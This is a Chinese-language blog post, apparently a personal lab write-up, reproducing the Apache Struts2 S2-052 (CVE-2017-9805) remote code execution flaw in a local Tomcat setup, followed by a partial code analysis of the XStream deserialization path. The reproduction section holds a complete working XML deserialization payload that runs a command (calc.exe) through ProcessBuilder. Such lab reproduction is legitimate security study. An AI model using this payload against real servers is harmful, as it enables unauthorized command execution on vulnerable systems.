---
layout: post
title: 'struts2[s2-052]远程命令执行漏洞复现'
tags: []
categories:
  - 漏洞复现
author: 1ss4k
date: 2021-03-31 14:12:00
---
## 漏洞信息

编号：CVE-2017-9805



## 环境搭建

1、Windows 10(64位)

2、tomcat9.0

参考

[安装配置 by荆棘云海](https://blog.csdn.net/weixin_44092289/article/details/88374898)

 [startup错误解决 by Jessica-小波](https://blog.csdn.net/wxb141001yxx/article/details/96976380)

/bin目录下，开启：startup，关闭：shutdown

3、struts-2.5.12

[下载地址](http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip )

[2.5.12源码下载地址](https://archive.apache.org/dist/struts/2.5.12/)

4、bp

在C盘目录下，直接`运行.bat`，使用Chrome浏览器，端口8088

[配置教程](https://blog.csdn.net/qiushisoftware/article/details/107784751)



## 复现过程

1、bp抓包

访问`ip:8080/struts2-rest-showcase/`

![upload successful](/images/pasted-307.png)

2、改包

Content-Type: application/x-www-form-urlencoded 表示使用URL编码的方式来编码表单，是浏览器默认的编码格式。当action为get时候，浏览器用x-www-form-urlencoded的编码方式把form数据转换成一个字串（name1=value1&name2=value2…），然后把这个字串append到url后面，用?分割，加载这个新的url。



post改为如下内容

```python
<map>

<entry>

<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>calc.exe</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>

</entry>

</map>
```



发送，弹出计算器～

![upload successful](/images/pasted-308.png)

## 漏洞分析

参考现有文章，请求会被传给下面的函数👇

![upload successful](/images/pasted-309.png)

其中含有语句

```java
        HttpServletRequest request = ServletActionContext.getRequest();
        ContentTypeHandler handler = selector.getHandlerForRequest(request);
```

getHandlerForRequest在此处是XStreamHandler，随后调用如下函数

```java
    public void toObject(Reader in, Object target) {
        XStream xstream = createXStream();
        xstream.fromXML(in, target);
    }
```

from XML 调用unmarshal，创建hashMap并且调用PopulateMap

PopulateMap调用PutCurrentEntryIntoMap，其再调用readItem，此时变量值如下

![upload successful](/images/pasted-310.png)
接着调用doUnmarshal，得到node name，搜索class name。

...

下面还有很复杂的过程，但是自己既不会java，也没弄好调试...所以看不懂

大致的过程就是REST插件在解析请求中的xml文件时，调用了XStreamHandler，传入的数据会被默认进行反序列化，如果当传入的xml是个经过XStream序列化的恶意对象时，便造成反序列化漏洞。



收获：

1、如果想自己分析的话，需要远程调试。但是还没配置好

2、三五太难了😭



参考

[Apache Struts at REST: Analyzing Remote Code Execution Vulnerability CVE-2017-9805 by McAfee](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/)

[struts2(s2-052)远程命令执行漏洞复现 by 渗透测试中心](https://www.cnblogs.com/backlion/p/7490260.html)

[STRUTS2 S2-052远程代码执行漏洞分析 CVE-2017-9805 by MANNING23](https://manning23.github.io/2017/09/10/Struts2-S2-052%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-9805/)